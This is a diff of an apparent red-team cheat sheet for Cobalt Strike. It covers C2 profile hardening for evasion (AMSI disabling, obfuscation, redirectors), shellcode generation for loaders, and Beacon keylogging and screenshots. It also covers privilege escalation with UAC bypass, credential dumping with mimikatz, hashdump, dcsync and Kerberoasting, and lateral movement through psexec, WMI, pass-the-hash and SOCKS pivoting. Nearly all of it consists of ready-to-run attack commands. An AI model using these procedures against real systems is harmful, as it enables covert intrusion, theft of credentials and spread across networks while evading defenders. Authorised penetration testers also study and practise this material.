@@ -40,7 +40,17 @@ cd ..
 mv arsenal-kit /opt/cobaltstrike/
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# OPSEC: change the following options in your Malleable C2 profile:
+# Create a random C2 profile
+
+cd third-party/FortyNorthSecurity-C2concealer/
+chmod 755 install.sh
+./install.sh
+C2concealer --variant 3 --hostname target.com
+Answer the questions.
+This will create a random.profile.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# OPSEC: If you manually create a new C2 profile, change the following options:
 
 set host_stage          "false";
 set pipename            "changeme_###";           The default SMB Beacon named pipe is msagent_###
@@ -49,29 +59,34 @@ set ssh_banner          "changeme";               The default SSH banner is Coba
 set ssh_pipename        "changeme_####";          The default SSH Beacon named pipe is postex_ssh_####
 
 https-certificate {
-    Change the location options.
-
+	set CN "changgme.com";
+	set O "Changgme;
+	set L "Changgme";
+	set ST "Changgme";
+	set C "US";
+	set validity "365";
+}
 stage {
-    set cleanup          "true";
-    set obfuscate        "true";
+    set userwx           "false";
     set sleep_mask       "true";
-    set smartinject      "true";
+    set cleanup          "true";
     set stomppe          "true";
-    set userwx           "false";
+    set obfuscate        "true";
     set name             "changeme.dll";
-
+}
 process-inject {
-    set allocator        "NtMapViewOfSection";
+    set allocator        "NtMapViewOfSection";  # Need to dbl check this.
     set userwx           "false";
     set smartinject      "true";
-
+}
 post-ex {
     set spawnto_x86      "%windir%\\syswow64\\dllhost.exe";
     set spawnto_x64      "%windir%\\sysnative\\dllhost.exe";
     set obfuscate        "true";
-    set pipename         "changeme_####, win\\changeme_##";
     set smartinject      "true";
     set amsi_disable     "true";
+    set pipename         "changeme_####, win\\changeme_##";
+}
 
 Review /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile for more default settings.
 
@@ -84,9 +99,11 @@ Start a screen session: screen -S lee
 
 Parameters in <> are mandatory, those in [] are optional
 ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
-./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2022-12-31
+./teamserver 192.168.1.5 third-party/FortyNorthSecurity-C2concealer/random.profile 2022-12-31
 
 When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
+
+OPSEC: Always use a Malleable C2 profile.
 
 - Remove old data and Beacons (optional)
 Stop the team server.
@@ -107,14 +124,14 @@ Connect
 Verify Fingerprint (SHA256 hash from above) > Yes
 
 - Remote connection
-OPSEC: never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
+OPSEC: Never expose port 50050 directly to the internet. Always use SSH and locally forward the connection.
 ssh -f -N -L 50050:127.0.0.1:50050 user@teamserver
 Follow the steps from above.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Redirectors
 
-OPSEC: never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
+OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
 
 - Create 3 free Ubuntu instances in the cloud. These instances will be used for the following:
 Redirector 1 - domain1
@@ -180,7 +197,7 @@ Save
 
 # Payloads
 
-OPSEC: staged payloads tend to have more indicators compared to stageless.
+OPSEC: Staged payloads tend to have more indicators compared to stageless.
 Always prefer a fully staged or stageless payload and disable payload staging.
 (S) in the framework refers to a stageless payload.
 
@@ -205,10 +222,11 @@ Listener: select the https listener > Choose
 Output: Raw
 x64: Use x64 payload
 Generate > Save > OK
+Feed this shellcode into a tool like Scarecrow or another loader.
 
-
-
-
+- Troubleshooting
+View > Web Log
+This is helpful to know when HTTP/S requests are accessing your team server.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Interact with a Beacon
@@ -219,59 +237,57 @@ help <command>                                    Get more help on a particular 
 ctrl +/-                                          Increase or decrease the font size
 ctrl k                                            Clear the tab
 
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
+helpx                                             OPSEC color coded commands
+
 By default, Beacon will check in every 60 seconds.
 sleep 0                                           Make a Beacon interactive
 sleep 10                                          Make a Beacon call home every 10 seconds
 sleep 90 10                                       Make a Beacon call home every 90 seconds with a 10% jitter
 
+- Misc
+Use the up arrow to scroll through previous commands.
+Beacon is fully tab-completable.
+All commands and their output are written to the logs directory.
 Right-click on the X in the tab for additional options.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Situational awareness
+
+- Beacon Object File (BOF)
+A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process.
+Cobalt Strike > Script Manger > Load
+/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
+helpx                                              New commands added to 'help'
+
+whoami
+net domain
+net user
+net computers
+net domain_controllers
+
+View > Targets                                    Discovered hosts will populate this tab
+
+ps                                                Show running processes
+
+screenshot <PID> x64                              Take a screenshot (look for svchost from the current user)
+                                                  View > Screenshots
+
+keylogger <PID> x64                               Inject a keystroke logger into a process (look for svchost from the current user)
+                                                  View > Keystrokes
+
+portscan 10.0.0.1-10.0.0.255 22,80,443,445,1433,3389 none 255
+Go to the Targets tab, select all the targets > right-click > Services
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Clean up
 
-Select a particular Beacon > exit                 This will cause a Beacon to no longer check in
-Right click on the Beacon > Session > Remove
+Select a particular Beacon > exit                 Beacon to no longer check in
+Right click on the Beacon > Session > Remove      Remove the dead Beacon
+
 Site Management > Manage
-Select each line > Kill
-Listeners > select a listener > Restart > OK
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Troubleshooting
-
-View > Web Log
-This is helpful to know when HTTP/S requests are hitting your team server.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Misc
-
-Use the up arrow to scroll through previous commands.
-Beacon is fully tab-completable.
-All commands and their output are written to the logs directory.
-ctrl+k will clear the current window.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Beacon Object File (BOF)
-
-A compiled C program that executes within Beacon and can call Win32 and Beacon APIs without spawning and injecting into a new process.
-
-Cobalt Strike > Script Manger > Load
-/opt/cobaltstrike/third-party/outflanknl-helpcolor/HelpColor.cna
-helpx                                             OPSEC color coded commands
-
-/opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
-                                                  New commands added
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-keylogger <PID> x64                               Inject a keystroke logger into a process
-                                                  View > Keystrokes
-
-screenshot <PID> x64                              Take a screenshot
-                                                  View > Screenshots
-
-- PowerShell weaponization
-powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
-powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
-psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
+Select each line > Kill                           Remove any Scripted Payload Delivery
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
@@ -281,34 +297,33 @@ getsystem                                         SYSTEM account impersonation u
 elevate svc-exe                                   Creates a SYSTEM service that will run our payload
 elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
 
-- PowerUp
-powershell-import /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
-powerpick Invoke-PrivescAudit
-
-Example output
-ServiceName   : BetaSvc
-Path          : C:\Temp\vuln.exe
-StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'BetaSvc'
-CanRestart    : Trun
-Name          : BetaSvc
-Check         : Modifiable Services
-
-powerpick Invoke-ServiceAbuse -Name 'BetaSvc'
-spawnas john Password123! smb
-Select john in the top pane > right-click > Interact
-bypassuac htts
-john should now be running in a high integrity Beacon (see asterisk)
-
 - Seatbelt
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=system
 execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -group=user
 
 - SharpUp
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/SharpUp.exe audit
+
+- PowerShell weaponization
+powershell <cmdlet> <args>                        Starts powershell.exe and uses the highest supported PowerShell version
+powerpick <cmdlet> <args>                         Spawns a sacrificial process specified by spawnto and injects UnmanagedPowerShell into it
+psinject <PID> <arch> <cmdlet> <args>             Injects UnmanagedPowerShell into the specified process
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Credential Abuse
+
+hashdump                                          Recover local account password hashes
+logonpasswords                                    Harvest credentials with mimikatz
+View > Credentials
+
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
+
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
+
+- Kerberoasting
+execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe kerberoast /outfile:hashes.txt
 
 - Double-hop workarounds
 1. Use a token that points to a non-network logon session
@@ -316,9 +331,9 @@ steal_token <PID>
 inject <PID> x64 <listener>
 
 2. Create a new token and logon session that has creds
-make_token <DOMAIN\user> <password>
-spawnas <DOMAIN\user> <password> <listener>
-pth <DOMAIN\user> <hash>
+make_token <domain\user> <password>
+spawnas <domain\user> <password> <listener>
+pth <domain\user> <hash>
 
 - Mimikatz
 ::                                                Show parent modules
@@ -332,20 +347,14 @@ lsadump::<module>                                 Interact with the Local Securi
     ::lsa                                         Local account hashes via the LSA APIs (and domain hashes on DCs)
     ::cache                                       Domain cached credentials on the system
     ::secrets                                     LSA Secrets (ex: service account passwords)
-    ::dcsync /user:<DOMAIN\user>
-
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe CredGuard
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe LSASettings
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Seatbelt.exe -q SecPackageCreds
-
-execute-assembly /opt/SharpCollection/NetFramework_4.7_x64/Rubeus.exe dump
-
-hashdump                                          Recover local account password hashes
-logonpasswords                                    Harvest credentials with mimikatz
-View > Credentials
+    ::dcsync /user:<domain\user>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Lateral movement
+
+make_token <domain\user> <password>
+ls \\<computer>\C$                                Check to see if you have access
+jump <psexec, psexec64, winrm, winrm64> <computer> <listener>
 
 schtasks /create /s <IP> /tn <name> /u <user> /sc <frequency> /p <password> /st <time> /sd <date> <command>
 sc \\IP create Service binPath= "command"
@@ -354,29 +363,26 @@ wmic /node:target.domain process call create "C:\Windows\System32\cmd.exe /c bea
 jump wmi_msbuild <target> <listener>
 
 - Double-hop options
-make_token <DOMAIN\user> <password>
+make_token <domain\user> <password>
 inject <PID> x64 <listener>
 steal_token <PID>
-pth <DOMAIN\user> <hash>
-spawnas <DOMAIN\user> <password> <listener>
+pth <domain\user> <hash>
+spawnas <domain\user> <password> <listener>
 
 socks <port>                                      Opens a port on the team server. Be sure to restrict access
 proxychains <tool/options>
 /etc/proxychains.conf                             Edit your attack VM’s config to your team server IP and port
-proxychains xfreerdp /u:<DOMAIN\user> /p:<password> /v:<IP>
+proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
 
 jump psexec                                       Run service EXE on remote host
 jump psexec_psh                                   Run a PowerShell one-liner on remote host via a service
 jump winrm                                        Run a PowerShell script via WinRM on remote host
 remote-exec <any of the above>                    Run a single command using the above methods on remote host
 
-make_token <DOMAIN\user> <password>
 powershell-import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 powerpick get-domainuser <user>
 powerpick Get-DomainComputer -Ping -Properties dnshostname
 powerpick Get-NetLocalGroupMember <computer>      List the local administrators group on a computer
-ls \\<computer>\C$                                Check to see if you have access
-jump <psexec, psexec64, winrm, winrm64> <computer> <listener>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Process injection
